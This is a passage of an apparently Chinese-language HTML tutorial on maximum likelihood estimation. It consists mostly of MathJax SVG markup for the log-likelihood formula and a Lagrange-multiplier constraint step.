-192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(4778,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5444.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msubsup\" transform=\"translate(6500.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,413) scale(0.707)\"><path data-c=\"35\" d=\"M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-253.5) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(7662.3,0)\"><path data-c=\"22C5\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z\"/></g><g data-mml-node=\"msubsup\" transform=\"translate(8162.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,413) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-253.5) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(9324.3,0)\"><path data-c=\"22C5\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z\"/></g><g data-mml-node=\"msubsup\" transform=\"translate(9824.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,413) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-247) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<blockquote>\n<p>联合概率 = 一组独立事件同时发生的概率之积。</p>\n</blockquote>\n<hr>\n<p><strong>步骤 3：取对数（log-likelihood）</strong></p>\n<p>我们取对数方便求导：</p>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.466ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"34.065ex\" height=\"2.036ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 15056.8 900\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(1278,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"mi\" transform=\"translate(1444.7,0)\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2403.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(3459.2,0)\"><path data-c=\"35\" d=\"M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4125.9,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(5403.9,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(5570.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(6732.3,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(7732.6,0)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(8399.2,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(9677.2,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(9843.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(11005.7,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(12005.9,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(12672.6,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(13950.6,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(14117.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<hr>\n<p><strong>步骤 4：加入约束（用拉格朗日乘子）</strong></p>\n<p>因为有 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"16.057ex\" height=\"1.946ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -666 7097.1 860\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1161.8,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(2162,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 